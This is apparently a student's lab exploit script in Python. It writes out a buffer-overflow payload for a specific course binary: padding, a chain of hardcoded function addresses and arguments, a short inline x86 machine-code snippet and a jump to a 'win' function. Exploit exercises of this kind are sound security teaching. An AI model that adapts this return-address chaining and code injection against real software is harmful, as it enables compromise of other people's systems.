# ----------------------------------------------------
# The names of the functions in comments correspond to 
# the ones they have in the README file. 
# Author: Smeu Florin-Ion
# Group: 322 CD
# ----------------------------------------------------

#!/usr/bin/env python

import struct
import sys

def p32(num):
	return struct.pack("<I", num)

offset = 0x8			# offset used to exploit the first vulnerability

func_no_param = 0x08048895	# FUNC_1
func_one_param = 0x080488ba	# FUNC_2
func_two_params = 0x080488ea	# FUNC_3

arg1 = 0xdeadc0de		# the argument of FUNC_2
arg2 = 0x78f26913		# the first argument of FUNC_3
arg3 = 0x65bb55dc		# the second argument of FUNC_3

func_switch = 0x0804893a	# menu function (CHOOSE_OPTION)
func_option3 = 0x08048736	# OPTION_3 function
func_option4=0x0804874e		# OPTION_4 function
win_func = 0x0804882b		# WIN_FUNC function

padding1 = 16			# number of characters used to 	
padding2 = 272			# complete the 1024 characters string
padding3 = 680			# inserted in OPTION_4

payload = "3\n" + offset * "a" + p32(func_no_param) + p32(func_one_param) 
payload +=  p32(func_option3) + p32(arg1) + offset * "a" + p32(func_two_params)
payload += p32(func_option4) + p32(arg2) + p32(arg3) + padding1 * "a" 
payload += "FlorinSmeu" + padding2 * "\xff" + "f" + padding3 * "\x00" 
payload += "\x55\x89\xe5\xc7\x05\xe8\xa3\x04\x08\x00\x00\x00\x00\xc7" 
payload += "\x05\x60\xa2\x04\x08\x00\x00\x00\x00\xc9\xc3" 
payload += p32(win_func) + padding1 * "a"

sys.stdout.write(payload)
